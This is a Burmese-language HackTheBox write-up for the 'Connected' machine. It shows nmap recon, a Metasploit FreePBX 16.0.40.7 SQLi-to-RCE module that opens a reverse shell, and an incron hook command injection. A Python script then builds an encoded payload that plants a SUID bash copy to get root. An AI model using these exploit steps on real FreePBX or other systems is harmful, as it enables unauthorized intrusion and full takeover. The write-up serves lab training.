+++
date = '2026-06-07T13:17:16+06:30'
title = 'Connected-3H3T3B'
cover = '/images/covers/bg6.webp'
+++

![image](/images/connected/connected.png) Connected

![image](/images/connected/1.png)

ဒီမှာဆိုရင် machine လေးစလိုက်ပြီးရင် ip ‌လေးရလာပါလိမ့်မယ် vpn ချိတ်ပြီးရင် 

## Recon

> ping machine_ip
```bash 
PING machine_ip (machine_ip) 56(84) bytes of data.
64 bytes from machine_ip: icmp_seq=1 ttl=63 time=5.33 ms
64 bytes from machine_ip: icmp_seq=2 ttl=63 time=1.14 ms
64 bytes from machine_ip: icmp_seq=3 ttl=63 time=2.39 ms
````

ဒီလိုမျိုးလေးတွေရလာရင် စပြီးတော့ pentest လို့ရပါပြီ machine box ကို

nmap နဲ့စပြီး port scan ပါမယ်

> nmap -sC -sV -oN nmap_top_svc.txt <machine_ip>
```bash
22/tcp   open  ssh      OpenSSH 7.4
80/tcp   open  http     Apache httpd 2.4.6
443/tcp  open  ssl/http Apache httpd 2.4.6 
```

80 and 443 port ရှိတယ်ဆိုတော့ webserver လေးရှိပါတယ် 

အရေးကြီးဆုံးက hackthebox ဆော့ရင် dns resolve အရင်လုပ်ဖို့ မမေ့ပါနဲ့ 

> sudo vim /etc/hosts

ပြီးရင် machine_ip connected.htb ထည့်ပါ 

![image](/images/connected/2.png)

အဲ့ဒီတော့ web page လေးကိုသွားကြည့်ရအောင် 

![image](/images/connected/3.png)

website ရဲ့အောက်ဆုံးနားလေးကို သတိထားကြည့်ပါ freepbx 16.0.40.7 ဆိုတာလေးကိုတွေ့ပါလိမ့်မယ် 
အဲ့ဒီတော့ public exploit ကိုရှာကြည့်လိုက်တဲ့အခါမှာ 

## User Exploit

[freerbpx 16.0.40.7 RCE ](https://www.exploit-db.com/exploits/52031)

rce exploit လေးရှိပါတယ် အဲ့ဒီတော့က msfconsole ကိုသုံးပြီး exploit လုပ်သွားပါမယ် 

```bash
msfconsole

use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS target_machine_ip
set VHOST connected.htb
set LHOST htb_local_ip
set LPORT 9001
set WfsDelay 90

run
```

![image](/images/connected/6.png)

shell လေးရလာပါလိမ့်မယ် local reverse shell ပြန်ယူပါမယ် metasploit ကနေ 

```bash
listening on [any] 6969 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.129.170.62] 53560
______                   ______ ______    
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _    ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '| / _ \ / _ \|  / | ___ \ /   \ 
| |    | |   |  /|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:5F:F9:E1 | 10.129.7.117              |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected asterisk]$ ls
OeTzGRhFQueT  user.txt

[asterisk@connected asterisk]$ cat user.txt
2aXXXXXXXXXXXXXXXXXXXX
```

ခုဆိုရင် cat user.txt လုပ်လိုက်ရုံနဲ့ user flag လေးရလာပါပြီ privilege escalation လုပ်ဖို့အတွက် path တွေလိုက်ရှာပါမယ်

## Privilege Escalation Analysis 

![image](/images/connected/4.png)

ဒီမှာဆိုရင် /usr/bin/sysadmin_manager ဆိုတဲ့ binary က ကျနော်တို့ရဲ့ လက်ရှိရထားတဲ့ shell user ရဲ့  /var/spool/asterisk/incron  ဒီ folder ကို စောင့်ကြည့်နေတာပဲဖြစ်ပါတယ် 

> cat /usr/bin/sysamin_manager ဆိုတဲ့ binary ကိုဖွင့်ကြည့်လိုက်တဲ့အခါမှာ 
```php
// Validate it matches the format of modulename_hookname, or modulename.hookname.params
if (!preg_match('/^(\w+)_([\w-]+)$/', $request, $parts)) {
    // No? How about modulename.hookname.params?
    if (!preg_match('/^([\w_]+)\.([\w-]+)(?:\.(.+))?$/', $request, $parts)) {
        syslog(LOG_ERR, "Invalid hook format");
        exit;
    }
}
```

ဒိမှာဆိုရင် modulename.hookname.params အဲ့ဒီတော့ ကျနော်တို့က /var/spool/asterisk/incron မှာ modulename.hookname.params ဒိလိုမျိုးဟာတစ်ခု create လိုက်ရင် auto analysis လာလုပ်မှာပါ အဲ့ဒီတော့ google မှာ research လုပ်ကြည့်တဲ့အခါမှာ api.fwconsole-commands ဆိုတဲ့ဟာက rce vulnerable  ဖြစ်နေတယ်ဆိုတာတွေ့လိုက်ရပါတယ် အဲ့ဒီတော့က အဲ့ file ကို analyse ရအောင်

> cat /var/www/html/admin/modules/api/hooks/fwconsole-commands
``` php
#!/usr/bin/php -q
<?php
error_reporting(E_ALL);
require '/usr/lib/sysadmin/includes.php';

$command = $argv[1];
$txn_id  = "";
if (isset($argv[1])) {
	// Underp the base64
	$b = str_replace('_', '/', $argv[1]);
	$settings = @json_decode(gzuncompress(@base64_decode($b)), true);
	if (is_array($settings)) {
		$command = $settings[0];
		$txn_id = $settings[1];
	}
}

try {
	$output = array();
	$cmd = "/usr/sbin/fwconsole $command 2>&1";
	$result = exec($cmd, $output, $return);
	if ($return == 0) {
		$message = 'Command executed successfully';
		$status = 'Executed';
	} else {
		$output = json_encode($output);
		$message =  "Failed to execute command [ " . $cmd . " ] , command output = $output";
		$status = 'Failed';
	}
} catch (\Exception $e) {
	$message = "Exception occurred in executing command " . $cmd .  " Error = " . $e->getMessage();
	$status = 'Failed'; 
}

$db = \Sysadmin\FreePBX::Database();
$sql = ("UPDATE IGNORE api_asynchronous_transaction_history SET event_status = :event_status , failure_reason =:failure_reason, process_end_time =:end_time WHERE `txn_id` = :txn_id");
$sth = $db->prepare($sql);
$sth->execute([
	":event_status" => $status,
	":failure_reason" => $message,
	":end_time" => time(),
	":txn_id" => $txn_id
]);
?>
 ..........................................

$cmd = "/usr/sbin/fwconsole $command 2>&1";
$result = exec($cmd, $output, $return);
```

## ROOT EXPLOIT 
now time to create payload
> /var/spool/asterisk/incron/api.fwconsole-commands.payload 

ဒီလိုပုံစံလေးပါ file create လိုက်တာနဲ့ 
> system("$hookfile $params"); ဆိုတာက $hookfile = fwconsole-commands and payload=params

အဲ့ဒီအတွက်ကြောင်း payload create လိုက်ကြရအောင်  

```python
import base64
import zlib
import json

cmd = "id; /bin/cp /bin/bash /var/www/html/shura-turtle; /bin/chmod u+s /var/www/html/shura-turtle"     
payload = base64.b64encode(
            zlib.compress(json.dumps([cmd, "txn"]).encode())
          ).decode().replace("/", "_")                                              

print(payload)
```

> ဘာလို့ခုလိုမျိုး python payload create ဖို့သိတာလဲဆိုရင် အပေါ်မှာ /var/www/html/admin/modules/api/hooks/fwconsole-commands ဒီ file analyse ပြီးသိလာတာပဲဖြစ်ပါတယ်

``` plain
eJyLVspMsVbQT8rM008ugNBJicUZCvpliUX65eXl+hkluTn6xRmlRYm6JaVFJTmpMNUZufkpCqXaxXiUKukoKJVU5CnFAgAGdyNc
```

ဒီ payload လေးရလာပါလိမ့်မယ် အဲ့ဒီ payload ‌လေးကိုသုံးပြီးကျနော် အပေါ်မှာပြောခဲ့သလိုမျိုး သွား create ကြမယ် 
ဒီ folder path ထဲမှာ
```bash
touch /var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspMsVbQT8rM008ugNBJicUZCvpliUX65eXl+hkluTn6xRmlRYm6JaVFJTmpMNUZufkpCqXaxXiUKukoKJVU5CnFAgAGdyNc
```

```prompt
[asterisk@connected html]$ ls

admin      robots.txt    this-is-an-ioc-not-actually-watchTowr-fsep9pb4r8.php  ucp
index.php  root.txt      this-is-an-ioc-not-actually-watchTowr-rnh0emioab.php  wcb.php
restapps   shura-turtle  this-is-an-ioc-not-actually-watchTowr-v266l6rnj0.php
```

ဒီမှာဆိုရင် မြင်ရတဲ့အတိုင်းပါပဲ shura-turtle ဆိုတဲ့ binary file လေးရလာပါလိမ့်မယ် 

> ./shura-turtle -p

boom!!! we got root 

![image](/images/connected/7.png)